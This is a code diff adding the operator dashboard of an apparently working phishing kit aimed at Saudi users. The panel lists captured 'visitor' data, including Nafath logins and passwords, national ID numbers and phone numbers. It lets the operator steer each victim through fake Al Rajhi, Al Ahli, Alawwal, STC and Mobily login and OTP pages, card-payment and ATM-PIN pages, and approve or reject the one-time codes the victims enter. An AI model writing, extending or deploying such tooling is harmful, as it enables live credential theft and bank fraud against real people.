+              html += '<button id="' + rajhiPhoneBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>توثيق الجوال</button>';
+              html += '<button id="' + rajhiOtpBtnId + '" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>راجحي OTP</button>';
+              html += '</div>';
+              setTimeout(() => {
+                const phoneBtn = document.getElementById(rajhiPhoneBtnId);
+                const otpBtn = document.getElementById(rajhiOtpBtnId);
+                if (phoneBtn) {
+                  phoneBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'phone-verification');
+                    const originalText = phoneBtn.textContent;
+                    const originalClasses = ['bg-green-600', 'hover:bg-green-700'];
+                    phoneBtn.textContent = 'تم الإرسال ✓';
+                    phoneBtn.classList.remove(...originalClasses);
+                    phoneBtn.classList.add('bg-gray-500');
+                    setTimeout(() => {
+                      phoneBtn.textContent = originalText;
+                      phoneBtn.classList.remove('bg-gray-500');
+                      phoneBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+                if (otpBtn) {
+                  otpBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'alrajhi-otp');
+                    const originalText = otpBtn.textContent;
+                    const originalClasses = ['bg-blue-600', 'hover:bg-blue-700'];
+                    otpBtn.textContent = 'تم الإرسال ✓';
+                    otpBtn.classList.remove(...originalClasses);
+                    otpBtn.classList.add('bg-green-600');
+                    setTimeout(() => {
+                      otpBtn.textContent = originalText;
+                      otpBtn.classList.remove('bg-green-600');
+                      otpBtn.classList.add(...originalClasses);
+                    }, 1500);
+                  });
+                }
+              }, 100);
+            }
+            
+            // إضافة زر موافقة لطلب إعادة إرسال الرمز
+            if (dataEntry.content && dataEntry.content['طلب'] === 'إعادة إرسال رمز') {
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="resend-btn-' + visitor.socketId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium cursor-pointer"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
+              html += '</div>';
+              // إضافة event listener بعد إنشاء العنصر
+              setTimeout(() => {
+                const btn = document.getElementById('resend-btn-' + visitor.socketId);
+                if (btn) {
+                  btn.addEventListener('click', () => approveResendCode(visitor.socketId));
+                }
+              }, 100);
+            }
+            
+            html += '</div>';
+          }
+        });
+        html += '</div>';
+      }
+      
+      if (!allEntries.length && visitor.data && Object.keys(visitor.data).length > 0) {
+        // Fallback to old data format
+        const nafathData = {};
+        const updateInfoData = {};
+        const otherData = {};
+        
+        const updateInfoKeys = ['الاسم بالعربي', 'الاسم بالإنجليزي', 'رقم الهوية الوطنية', 'تاريخ الميلاد', 'الجنسية', 'نوع المالك', 'الجنس',
+          'رقم الجوال', 'البريد الإلكتروني', 'العنوان الوطني', 'رقم المبنى', 'رقم الطابق',
+          'النشاط العام', 'النشاط الخاص', 'رأس المال',
+          'علامة تجارية', 'اسم العلامة', 'اسم المحل', 'رقم المحل', 'رقم العقار', 'عدد الفتحات', 'عدد الطوابق', 'عدد الكاميرات', 'مصعد', 'داخل مجمع تجاري', 'نوع العقد',
+          'نوع اللوحة', 'مساحة اللوحة', 'نوع المسار',
+          'نوع الاسم', 'الاسم التجاري', 'اسم العلامة بالعربي', 'اسم العلامة بالإنجليزي',
+          'اسم الخدمة', 'رقم الطلب', 'رقم السجل التجاري'];
+        
+        Object.entries(visitor.data).forEach(([key, value]) => {
+          if (['اسم المستخدم / الهوية الوطنية', 'كلمة المرور (نفاذ)'].includes(key)) {
+            nafathData[key] = value;
+          } else if (updateInfoKeys.includes(key)) {
+            updateInfoData[key] = value;
+          } else {
+            otherData[key] = value;
+          }
+        });
+
+        // Update Info Data Section (shown first - newer data)
+        if (Object.keys(updateInfoData).length > 0) {
+          html += '<div class="data-section bg-blue-50 p-4 rounded-lg">';
+          html += '<h3 class="font-bold mb-3 text-blue-800">📋 بيانات تحديث المعلومات</h3>';
+          html += '<div class="grid grid-cols-2 gap-3">';
+          Object.entries(updateInfoData).forEach(([key, value]) => {
+            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
+          });
+          html += '</div></div>';
+        }
+
+        // Nafath Data Section (shown second - older data)
+        if (Object.keys(nafathData).length > 0) {
+          html += '<div class="data-section bg-teal-50 p-4 rounded-lg" style="border-right-color: #14b8a6;">';
+          html += '<h3 class="font-bold mb-3 text-teal-800">🔐 بيانات نفاذ</h3>';
+          html += '<div class="grid grid-cols-2 gap-3">';
+          Object.entries(nafathData).forEach(([key, value]) => {
+            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + value + '</span></div>';
+          });
+          html += '</div></div>';
+        }
+        
+        // Other Data Section
+        if (Object.keys(otherData).length > 0) {
+          html += '<div class="data-section bg-gray-50 p-4 rounded-lg">';
+          html += '<h3 class="font-bold mb-3 text-gray-800">📝 بيانات أخرى</h3>';
+          html += '<div class="grid grid-cols-2 gap-3">';
+          Object.entries(otherData).forEach(([key, value]) => {
+            html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + value + '</span></div>';
+          });
+          html += '</div></div>';
+        }
+      }
+
+      // Actions
+      html += '<div class="border-t pt-4"><h3 class="font-bold mb-3">إجراءات</h3>';
+      html += '<div class="grid grid-cols-2 gap-4">';
+      
+      // Send Code
+      html += '<div><label class="block text-sm text-gray-500 mb-1">إرسال رمز</label>';
+      html += '<div class="flex gap-2"><input type="text" id="codeInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="أدخل الرمز" value="' + (visitor.lastSentCode || '') + '">';
+      html += '<button id="sendCodeBtn" onclick="sendCode(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700">إرسال</button></div></div>';
+      
+      // Navigate
+      html += '<div><label class="block text-sm text-gray-500 mb-1">توجيه لصفحة</label>';
+      html += '<div class="flex gap-2"><select id="navigateSelect" class="flex-1 px-3 py-2 border rounded-lg">';
+      html += '<option value="">اختر صفحة</option>';
+      html += '<option value="credit-card-payment">الدفع بالبطاقة</option>';
+      html += '<option value="otp-verification">OTP البطاقة</option>';
+      html += '<option value="atm-password">كلمة مرور ATM</option>';
+      html += '<option value="phone-verification">توثيق الجوال</option>';
+      html += '<option value="phone-otp">OTP الجوال</option>';
+      html += '<option value="stc-call-alert">تنبيه STC</option>';
+      html += '<option value="mobily-call-alert">تنبيه Mobily</option>';
+      html += '<option value="nafath-login-page">نفاذ</option>';
+      html += '<option value="nafath-verify">تحقق نفاذ</option>';
+      html += '<option value="alrajhi-login">الراجحي - تسجيل دخول</option>';
+      html += '<option value="alrajhi-otp">الراجحي - OTP</option>';
+      html += '<option value="alrajhi-nafath">الراجحي - نفاذ</option>';
+      html += '<option value="alrajhi-alert">الراجحي - تنبيه</option>';
+      html += '<option value="alrajhi-call">الراجحي - اتصال</option>';
+      html += '<option value="alawwal-bank">بنك الأول</option>';
+      html += '<option value="alawwal-nafath">الأول - نفاذ</option>';
+      html += '<option value="alahli-otp">الأهلي - OTP</option>';
+      html += '<option value="bank-transfer">التحويل البنكي</option>';
+      html += '<option value="bank-account-number">رقم الحساب</option>';
+      html += '<option value="mystc-otp">MyStc OTP</option>';
+      html += '<option value="stc-password">كلمة مرور STC</option>';
+      html += '<option value="final-page">الصفحة النهائية</option>';
+      html += '</select>';
+      html += '<button onclick="navigateVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700">توجيه</button></div></div>';
+      
+      html += '</div>';
+      
+      // Send Message
+      html += '<div class="mt-4"><label class="block text-sm text-gray-500 mb-1">إرسال رسالة نهائية</label>';
+      html += '<div class="flex gap-2"><input type="text" id="messageInput" class="flex-1 px-3 py-2 border rounded-lg" placeholder="أدخل الرسالة">';
+      html += '<button onclick="sendMessage(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700">إرسال</button></div></div>';
+      
+      // Block and Delete
+      html += '<div class="flex gap-2 mt-4">';
+      html += '<button onclick="blockVisitor(\'' + visitor.socketId + '\')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700">حظر</button>';
+      html += '<button onclick="deleteVisitor(\'' + visitor._id + '\')" class="px-4 py-2 bg-gray-600 text-white rounded-lg hover:bg-gray-700">حذف</button>';
+      html += '</div></div>';
+
+      html += '</div>';
+      
+      visitorDetails.innerHTML = html;
+    }
+
+    // Action functions
+    function approveForm(socketId) {
+      socket.emit('admin:approve', { visitorSocketId: socketId });
+    }
+
+    function rejectForm(socketId) {
+      socket.emit('admin:reject', { visitorSocketId: socketId });
+    }
+
+    function sendCode(socketId) {
+      const code = document.getElementById('codeInput').value;
+      const btn = document.getElementById('sendCodeBtn');
+      if (code && btn) {
+        socket.emit('admin:sendCode', { visitorSocketId: socketId, code });
+        // إظهار "تم الإرسال" مؤقتاً
+        const originalText = btn.textContent;
+        btn.textContent = 'تم الإرسال ✓';
+        btn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+        btn.classList.add('bg-green-600');
+        setTimeout(() => {
+          btn.textContent = originalText;
+          btn.classList.remove('bg-green-600');
+          btn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+        }, 1500);
+      }
+    }
+
+    function sendNafathCodeTop(socketId, visitorId) {
+      const code = document.getElementById('nafathCodeTop_' + visitorId).value;
+      const btn = document.getElementById('sendNafathBtnTop_' + visitorId);
+      if (code && btn) {
+        socket.emit('admin:sendCode', { visitorSocketId: socketId, code });
+        // إظهار "تم الإرسال" مؤقتاً
+        const originalText = btn.textContent;
+        btn.textContent = 'تم الإرسال ✓';
+        btn.classList.remove('bg-blue-600', 'hover:bg-blue-700');
+        btn.classList.add('bg-green-600');
+        setTimeout(() => {
+          btn.textContent = originalText;
+          btn.classList.remove('bg-green-600');
+          btn.classList.add('bg-blue-600', 'hover:bg-blue-700');
+        }, 1500);
+      }
+    }
+
+    function navigateVisitor(socketId) {
+      const page = document.getElementById('navigateSelect').value;
+      if (page) {
+        socket.emit('admin:navigate', { visitorSocketId: socketId, page });
+      }
+    }
+
+    function navigateVisitorTop(socketId) {
+      const page = document.getElementById('navigateSelectTop').value;
+      if (page) {
+        socket.emit('admin:navigate', { visitorSocketId: socketId, page });
+      }
+    }
+
+    // دالة تحويل الزائر لصفحة محددة مباشرة
+    function navigateVisitorToPage(socketId, page) {
+      socket.emit('admin:navigate', { visitorSocketId: socketId, page });
+    }
+
+    // دالة الموافقة على طلب إعادة إرسال الرمز
+    function approveResendCode(socketId) {
+      console.log('approveResendCode called with socketId:', socketId);
+      socket.emit('admin:approveResend', { visitorSocketId: socketId });
+      // تغيير الزر لإظهار "تم ✓"
+      const btn = document.getElementById('resend-btn-' + socketId);
+      if (btn) {
+        btn.textContent = 'تم ✓';
+        btn.disabled = true;
+        btn.classList.remove('bg-green-600', 'hover:bg-green-700');
+        btn.classList.add('bg-gray-400', 'cursor-not-allowed');
+      }
+      console.log('admin:approveResend emitted');
+    }
+
+    // Card action functions
+    function cardActionOTP(socketId) {
+      const btn = event.target;
+      const originalText = btn.textContent;
+      const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-blue-600';
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'otp' });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove(originalBg);
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add(originalBg);
+      }, 1500);
+    }
+
+    function cardActionATM(socketId) {
+      const btn = event.target;
+      const originalText = btn.textContent;
+      const originalBg = btn.className.match(/bg-\w+-\d+/)?.[0] || 'bg-yellow-600';
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'atm' });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove(originalBg);
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add(originalBg);
+      }, 1500);
+    }
+
+    function cardActionReject(socketId) {
+      const btn = event.target;
+      const originalText = btn.textContent;
+      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'reject' });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove('bg-red-600', 'hover:bg-red-700');
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add('bg-red-600', 'hover:bg-red-700');
+      }, 1500);
+    }
+
+    // Code action functions (for OTP/digit codes)
+    function codeActionApprove(socketId, codeIndex) {
+      const btn = event.target;
+      const originalText = btn.textContent;
+      socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'approve', codeIndex });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove('bg-green-600', 'hover:bg-green-700');
+      btn.classList.add('bg-gray-500');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-gray-500');
+        btn.classList.add('bg-green-600', 'hover:bg-green-700');
+      }, 1500);
+    }
+
+    function codeActionReject(socketId, codeIndex) {
+      const btn = event.target;
+      const originalText = btn.textContent;
+      socket.emit('admin:codeAction', { visitorSocketId: socketId, action: 'reject', codeIndex });
+      btn.textContent = 'تم الإرسال ✓';
+      btn.classList.remove('bg-red-600', 'hover:bg-red-700');
+      btn.classList.add('bg-green-600');
+      setTimeout(() => {
+        btn.textContent = originalText;
+        btn.classList.remove('bg-green-600');
+        btn.classList.add('bg-red-600', 'hover:bg-red-700');
+      }, 1500);
+    }
+
+    function sendMessage(socketId) {
+      const message = document.getElementById('messageInput').value;
+      if (message) {
+        socket.emit('admin:sendMessage', { visitorSocketId: socketId, message });
+        document.getElementById('messageInput').value = '';
+      }
+    }
+
+    function blockVisitor(socketId) {
+      if (confirm('هل أنت متأكد من حظر هذا الزائر؟')) {
+        socket.emit('admin:block', { visitorSocketId: socketId });
+      }
+    }
+
+    function deleteVisitor(visitorId) {
+      if (confirm('هل أنت متأكد من حذف هذا الزائر؟')) {
+        socket.emit('admin:deleteById', visitorId);
+        visitors.delete(visitorId);
+        selectedVisitorId = null;
+        renderVisitorsList();
+        visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>اختر زائر لعرض التفاصيل</p></div>';
+      }
+    }
+
+    function deleteVisitorFromCard(visitorId) {
+      if (confirm('هل أنت متأكد من حذف العميل؟')) {
+        socket.emit('admin:deleteById', visitorId);
+        visitors.delete(visitorId);
+        if (selectedVisitorId === visitorId) {
+          selectedVisitorId = null;
+          visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>اختر زائر لعرض التفاصيل</p></div>';
+        }
+        renderVisitorsList();
+      }
+    }
+
+    // Notification
+    function showNotification(message) {
+      if (Notification.permission === 'granted') {
+        new Notification('لوحة التحكم', { body: message });
+      }
+    }
+
+    // Request notification permission
+    if ('Notification' in window) {
+      Notification.requestPermission();
+    }
+
+    // Settings menu functions
+    function toggleSettingsMenu() {
+      const menu = document.getElementById('settingsMenu');
+      menu.classList.toggle('hidden');
+    }
+
+    // Close settings menu when clicking outside
+    document.addEventListener('click', (e) => {
+      const menu = document.getElementById('settingsMenu');
+      const btn = document.getElementById('settingsBtn');
+      if (!menu.contains(e.target) && !btn.contains(e.target)) {
+        menu.classList.add('hidden');
+      }
+    });
+
+    // Change password modal functions
+    function showChangePasswordModal() {
+      document.getElementById('settingsMenu').classList.add('hidden');
+      document.getElementById('changePasswordModal').classList.remove('hidden');
+      document.getElementById('oldPassword').value = '';
+      document.getElementById('newPassword').value = '';
+      document.getElementById('confirmPassword').value = '';
+      document.getElementById('passwordError').classList.add('hidden');
+      document.getElementById('passwordSuccess').classList.add('hidden');
+    }
+
+    function hideChangePasswordModal() {
+      document.getElementById('changePasswordModal').classList.add('hidden');
+    }
+
+    // Change password form handler
+    document.getElementById('changePasswordForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const oldPassword = document.getElementById('oldPassword').value;
+      const newPassword = document.getElementById('newPassword').value;
+      const confirmPassword = document.getElementById('confirmPassword').value;
+      const errorEl = document.getElementById('passwordError');
+      const successEl = document.getElementById('passwordSuccess');
+
+      errorEl.classList.add('hidden');
+      successEl.classList.add('hidden');
+
+      if (!oldPassword || !newPassword || !confirmPassword) {
+        errorEl.textContent = 'يرجى ملء جميع الحقول';
+        errorEl.classList.remove('hidden');
+        return;
+      }
+
+      if (newPassword !== confirmPassword) {
+        errorEl.textContent = 'كلمة المرور الجديدة غير متطابقة';
+        errorEl.classList.remove('hidden');
+        return;
+      }
+
+      socket.emit('admin:changePassword', { oldPassword, newPassword });
+    });
+
+    // Clear all data function
+    function clearAllData() {
+      document.getElementById('settingsMenu').classList.add('hidden');
+      if (confirm('تحذير: سيتم حذف جميع الزوار والبيانات بشكل نهائي!\n\nهل أنت متأكد؟')) {
+        if (confirm('هذا الإجراء لا يمكن التراجع عنه!\n\nاضغط موافق للتأكيد النهائي')) {
+          socket.emit('admin:clearAllData');
+          visitors.clear();
+          selectedVisitorId = null;
+          renderVisitorsList();
+          visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>اختر زائر لعرض التفاصيل</p></div>';
+          alert('تم مسح جميع البيانات بنجاح');
+        }
+      }
+    }
+
+    // Logout function
+    function logout() {
+      localStorage.removeItem('adminPassword');
+      if (socket) {
+        socket.disconnect();
+      }
+      dashboard.classList.add('hidden');
+      loginModal.style.display = 'flex';
+      document.getElementById('password').value = '';
+      loginError.classList.add('hidden');
+    }
+
+    // Select all visitors
+    function selectAllVisitors() {
+      const checkboxes = document.querySelectorAll('.visitor-checkbox');
+      const allChecked = Array.from(checkboxes).every(cb => cb.checked);
+      checkboxes.forEach(cb => cb.checked = !allChecked);
+    }
+
+    // Delete selected visitors
+    function deleteSelectedVisitors() {
+      const checkboxes = document.querySelectorAll('.visitor-checkbox:checked');
+      if (checkboxes.length === 0) {
+        alert('يرجى تحديد زائر واحد على الأقل');
+        return;
+      }
+      if (confirm('هل أنت متأكد من حذف ' + checkboxes.length + ' زائر؟')) {
+        checkboxes.forEach(cb => {
+          const visitorId = cb.dataset.visitorId;
+          socket.emit('admin:deleteById', visitorId);
+          visitors.delete(visitorId);
+        });
+        if (selectedVisitorId && !visitors.has(selectedVisitorId)) {
+          selectedVisitorId = null;
+          visitorDetails.innerHTML = '<div class="text-center py-12 text-gray-500"><svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/></svg><p>اختر زائر لعرض التفاصيل</p></div>';
+        }
+        renderVisitorsList();
+      }
+    }
+  </script>
+</body>
+</html>
